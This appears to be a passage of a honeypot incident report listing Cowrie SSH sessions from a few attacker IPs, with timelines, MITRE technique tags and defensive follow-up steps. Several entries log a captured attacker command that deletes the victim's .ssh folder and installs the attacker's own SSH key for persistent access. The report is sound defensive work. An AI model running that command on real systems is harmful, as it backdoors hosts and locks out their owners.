| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:07:05` | `cowrie.session.connect` |
| `2026-04-05 17:07:05` | `cowrie.client.version` |
| `2026-04-05 17:07:05` | `cowrie.client.kex` |
| `2026-04-05 17:07:05` | `cowrie.login.success` |
| `2026-04-05 17:07:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.204[.]246` to AbuseIPDB if not already reported
- [ ] Block `45.78.204[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdc80954d446

| Field | Detail |
|---|---|
| **Source IP** | `112.184.119[.]22` |
| **First Seen** | 2026-04-05 17:07 |
| **Last Seen** | 2026-04-05 17:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:07:33` | `cowrie.session.connect` |
| `2026-04-05 17:07:33` | `cowrie.client.version` |
| `2026-04-05 17:07:33` | `cowrie.client.kex` |
| `2026-04-05 17:07:34` | `cowrie.login.success` |
| `2026-04-05 17:07:34` | `cowrie.session.params` |
| `2026-04-05 17:07:34` | `cowrie.command.input` |
| `2026-04-05 17:07:34` | `cowrie.command.failed` |
| `2026-04-05 17:07:34` | `cowrie.log.closed` |
| `2026-04-05 17:07:35` | `cowrie.session.params` |
| `2026-04-05 17:07:35` | `cowrie.command.input` |
| `2026-04-05 17:07:35` | `cowrie.session.file_download` |
| `2026-04-05 17:07:35` | `cowrie.log.closed` |
| `2026-04-05 17:07:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.184.119[.]22` to AbuseIPDB if not already reported
- [ ] Block `112.184.119[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-257ea4c39a77

| Field | Detail |
|---|---|
| **Source IP** | `112.184.119[.]22` |
| **First Seen** | 2026-04-05 17:07 |
| **Last Seen** | 2026-04-05 17:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:07:37` | `cowrie.session.connect` |
| `2026-04-05 17:07:37` | `cowrie.client.version` |
| `2026-04-05 17:07:37` | `cowrie.client.kex` |
| `2026-04-05 17:07:38` | `cowrie.login.success` |
| `2026-04-05 17:07:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.184.119[.]22` to AbuseIPDB if not already reported
- [ ] Block `112.184.119[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72d02743a348

| Field | Detail |
|---|---|
| **Source IP** | `112.184.119[.]22` |
| **First Seen** | 2026-04-05 17:10 |
| **Last Seen** | 2026-04-05 17:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:10:27` | `cowrie.session.connect` |
| `2026-04-05 17:10:27` | `cowrie.client.version` |
| `2026-04-05 17:10:27` | `cowrie.client.kex` |
| `2026-04-05 17:10:28` | `cowrie.login.success` |
| `2026-04-05 17:10:28` | `cowrie.session.params` |
| `2026-04-05 17:10:28` | `cowrie.command.input` |
| `2026-04-05 17:10:28` | `cowrie.command.failed` |
| `2026-04-05 17:10:28` | `cowrie.log.closed` |
| `2026-04-05 17:10:28` | `cowrie.session.params` |
| `2026-04-05 17:10:28` | `cowrie.command.input` |
| `2026-04-05 17:10:29` | `cowrie.session.file_download` |
| `2026-04-05 17:10:29` | `cowrie.log.closed` |
| `2026-04-05 17:10:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.184.119[.]22` to AbuseIPDB if not already reported
- [ ] Block `112.184.119[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-999ce1364480

| Field | Detail |
|---|---|
| **Source IP** | `112.184.119[.]22` |
| **First Seen** | 2026-04-05 17:10 |
| **Last Seen** | 2026-04-05 17:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:10:31` | `cowrie.session.connect` |
| `2026-04-05 17:10:31` | `cowrie.client.version` |
| `2026-04-05 17:10:31` | `cowrie.client.kex` |
| `2026-04-05 17:10:31` | `cowrie.login.success` |
| `2026-04-05 17:10:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.184.119[.]22` to AbuseIPDB if not already reported
- [ ] Block `112.184.119[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6326e008a61f

| Field | Detail |
|---|---|
| **Source IP** | `112.184.119[.]22` |
| **First Seen** | 2026-04-05 17:12 |
| **Last Seen** | 2026-04-05 17:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:12:31` | `cowrie.session.connect` |
| `2026-04-05 17:12:31` | `cowrie.client.version` |
| `2026-04-05 17:12:31` | `cowrie.client.kex` |
| `2026-04-05 17:12:31` | `cowrie.login.success` |
| `2026-04-05 17:12:32` | `cowrie.session.params` |
| `2026-04-05 17:12:32` | `cowrie.command.input` |
| `2026-04-05 17:12:32` | `cowrie.command.failed` |
| `2026-04-05 17:12:32` | `cowrie.log.closed` |
| `2026-04-05 17:12:32` | `cowrie.session.params` |
| `2026-04-05 17:12:32` | `cowrie.command.input` |
| `2026-04-05 17:12:32` | `cowrie.session.file_download` |
| `2026-04-05 17:12:32` | `cowrie.log.closed` |
| `2026-04-05 17:12:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.184.119[.]22` to AbuseIPDB if not already reported
- [ ] Block `112.184.119[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1aa47f32acf1

| Field | Detail |
|---|---|
| **Source IP** | `112.184.119[.]22` |
| **First Seen** | 2026-04-05 17:12 |
| **Last Seen** | 2026-04-05 17:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:12:34` | `cowrie.session.connect` |
| `2026-04-05 17:12:34` | `cowrie.client.version` |
| `2026-04-05 17:12:34` | `cowrie.client.kex` |
| `2026-04-05 17:12:35` | `cowrie.login.success` |
| `2026-04-05 17:12:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.184.119[.]22` to AbuseIPDB if not already reported
- [ ] Block `112.184.119[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b52dc4851b2c

| Field | Detail |
|---|---|
| **Source IP** | `49.49.231[.]154` |
| **First Seen** | 2026-04-05 17:12 |
| **Last Seen** | 2026-04-05 17:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:12:55` | `cowrie.session.connect` |
| `2026-04-05 17:12:55` | `cowrie.client.version` |
| `2026-04-05 17:12:55` | `cowrie.client.kex` |
| `2026-04-05 17:12:55` | `cowrie.login.success` |
| `2026-04-05 17:12:55` | `cowrie.session.params` |
| `2026-04-05 17:12:55` | `cowrie.command.input` |
| `2026-04-05 17:12:55` | `cowrie.command.failed` |
| `2026-04-05 17:12:55` | `cowrie.log.closed` |
| `2026-04-05 17:12:56` | `cowrie.session.params` |
| `2026-04-05 17:12:56` | `cowrie.command.input` |
| `2026-04-05 17:12:56` | `cowrie.session.file_download` |
| `2026-04-05 17:12:56` | `cowrie.log.closed` |
| `2026-04-05 17:12:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.49.231[.]154` to AbuseIPDB if not already reported
- [ ] Block `49.49.231[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6df469f37d06

| Field | Detail |
|---|---|
| **Source IP** | `49.49.231[.]154` |
| **First Seen** | 2026-04-05 17:12 |
| **Last Seen** | 2026-04-05 17:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:12:57` | `cowrie.session.connect` |
| `2026-04-05 17:12:57` | `cowrie.client.version` |
| `2026-04-05 17:12:58` | `cowrie.client.kex` |
| `2026-04-05 17:12:58` | `cowrie.login.success` |
| `2026-04-05 17:12:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.49.231[.]154` to AbuseIPDB if not already reported
- [ ] Block `49.49.231[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6296558635a

| Field | Detail |
|---|---|
| **Source IP** | `112.184.119[.]22` |
| **First Seen** | 2026-04-05 17:13 |
| **Last Seen** | 2026-04-05 17:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:13:29` | `cowrie.session.connect` |
| `2026-04-05 17:13:29` | `cowrie.client.version` |
| `2026-04-05 17:13:29` | `cowrie.client.kex` |
| `2026-04-05 17:13:29` | `cowrie.login.success` |
| `2026-04-05 17:13:30` | `cowrie.session.params` |
| `2026-04-05 17:13:30` | `cowrie.command.input` |
| `2026-04-05 17:13:30` | `cowrie.command.failed` |
| `2026-04-05 17:13:30` | `cowrie.log.closed` |
| `2026-04-05 17:13:30` | `cowrie.session.params` |
| `2026-04-05 17:13:30` | `cowrie.command.input` |
| `2026-04-05 17:13:30` | `cowrie.session.file_download` |
| `2026-04-05 17:13:30` | `cowrie.log.closed` |
| `2026-04-05 17:13:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.184.119[.]22` to AbuseIPDB if not already reported
- [ ] Block `112.184.119[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5d136b81a90

| Field | Detail |
|---|---|
| **Source IP** | `112.184.119[.]22` |
| **First Seen** | 2026-04-05 17:13 |
| **Last Seen** | 2026-04-05 17:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:13:33` | `cowrie.session.connect` |
| `2026-04-05 17:13:33` | `cowrie.client.version` |
| `2026-04-05 17:13:33` | `cowrie.client.kex` |
| `2026-04-05 17:13:33` | `cowrie.login.success` |
| `2026-04-05 17:13:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.184.119[.]22` to AbuseIPDB if not already reported
- [ ] Block `112.184.119[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00b4d7878b4f

| Field | Detail |
|---|---|
| **Source IP** | `112.184.119[.]22` |
| **First Seen** | 2026-04-05 17:14 |
| **Last Seen** | 2026-04-05 17:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:14:27` | `cowrie.session.connect` |
| `2026-04-05 17:14:27` | `cowrie.client.version` |
| `2026-04-05 17:14:27` | `cowrie.client.kex` |
| `2026-04-05 17:14:28` | `cowrie.login.success` |
| `2026-04-05 17:14:28` | `cowrie.session.params` |
| `2026-04-05 17:14:28` | `cowrie.command.input` |
| `2026-04-05 17:14:28` | `cowrie.command.failed` |
| `2026-04-05 17:14:28` | `cowrie.log.closed` |
| `2026-04-05 17:14:29` | `cowrie.session.params` |
| `2026-04-05 17:14:29` | `cowrie.command.input` |
| `2026-04-05 17:14:29` | `cowrie.session.file_download` |
| `2026-04-05 17:14:29` | `cowrie.log.closed` |
| `2026-04-05 17:14:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.184.119[.]22` to AbuseIPDB if not already reported
- [ ] Block `112.184.119[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fa40bef0807

| Field | Detail |
|---|---|
| **Source IP** | `112.184.119[.]22` |
| **First Seen** | 2026-04-05 17:14 |
| **Last Seen** | 2026-04-05 17:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:14:31` | `cowrie.session.connect` |
| `2026-04-05 17:14:31` | `cowrie.client.version` |
| `2026-04-05 17:14:31` | `cowrie.client.kex` |
| `2026-04-05 17:14:31` | `cowrie.login.success` |
| `2026-04-05 17:14:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.184.119[.]22` to AbuseIPDB if not already reported
- [ ] Block `112.184.119[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-166edb00449a

| Field | Detail |
|---|---|
| **Source IP** | `49.49.231[.]154` |
| **First Seen** | 2026-04-05 17:15 |
| **Last Seen** | 2026-04-05 17:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:15:29` | `cowrie.session.connect` |
| `2026-04-05 17:15:29` | `cowrie.client.version` |
| `2026-04-05 17:15:29` | `cowrie.client.kex` |
| `2026-04-05 17:15:30` | `cowrie.login.success` |
| `2026-04-05 17:15:30` | `cowrie.session.params` |
| `2026-04-05 17:15:30` | `cowrie.command.input` |
| `2026-04-05 17:15:30` | `cowrie.command.failed` |
| `2026-04-05 17:15:30` | `cowrie.log.closed` |
| `2026-04-05 17:15:30` | `cowrie.session.params` |
| `2026-04-05 17:15:30` | `cowrie.command.input` |
| `2026-04-05 17:15:30` | `cowrie.session.file_download` |
| `2026-04-05 17:15:30` | `cowrie.log.closed` |
| `2026-04-05 17:15:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.49.231[.]154` to AbuseIPDB if not already reported
- [ ] Block `49.49.231[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bdc8f4d8f53

| Field | Detail |
|---|---|
| **Source IP** | `49.49.231[.]154` |
| **First Seen** | 2026-04-05 17:15 |
| **Last Seen** | 2026-04-05 17:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:15:32` | `cowrie.session.connect` |
| `2026-04-05 17:15:32` | `cowrie.client.version` |
| `2026-04-05 17:15:32` | `cowrie.client.kex` |
| `2026-04-05 17:15:33` | `cowrie.login.success` |
| `2026-04-05 17:15:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.49.231[.]154` to AbuseIPDB if not already reported
- [ ] Block `49.49.231[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62acc91e7fc5

| Field | Detail |
|---|---|
| **Source IP** | `49.49.231[.]154` |
| **First Seen** | 2026-04-05 17:18 |
| **Last Seen** | 2026-04-05 17:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:18:07` | `cowrie.session.connect` |
| `2026-04-05 17:18:07` | `cowrie.client.version` |
| `2026-04-05 17:18:07` | `cowrie.client.kex` |
| `2026-04-05 17:18:07` | `cowrie.login.success` |
| `2026-04-05 17:18:08` | `cowrie.session.params` |
| `2026-04-05 17:18:08` | `cowrie.command.input` |
| `2026-04-05 17:18:08` | `cowrie.command.failed` |
| `2026-04-05 17:18:08` | `cowrie.log.closed` |
| `2026-04-05 17:18:08` | `cowrie.session.params` |
| `2026-04-05 17:18:08` | `cowrie.command.input` |
| `2026-04-05 17:18:08` | `cowrie.session.file_download` |
| `2026-04-05 17:18:08` | `cowrie.log.closed` |
| `2026-04-05 17:18:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.49.231[.]154` to AbuseIPDB if not already reported
- [ ] Block `49.49.231[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b312efbe45fd

| Field | Detail |
|---|---|
| **Source IP** | `49.49.231[.]154` |
| **First Seen** | 2026-04-05 17:18 |
| **Last Seen** | 2026-04-05 17:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 17:18:10` | `cowrie.session.connect` |
| `2026-04-05 17:18:10` | `cowrie.client.version` |
| `2026-04-05 17:18:10` | `cowrie.client.kex` |
| `2026-04-05 17:18:10` | `cowrie.login.success` |
| `2026-04-05 17:18:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.49.231[.]154` to AbuseIPDB if not already reported
- [ ] Block `49.49.231[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fb9cfed2d73

| Field | Detail |
|---|---|
| **Source IP** | `112.184.119[.]22` |
| **First Seen** | 2026-04-05 17:18 |
| **Last Seen** | 2026-04-05 17:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
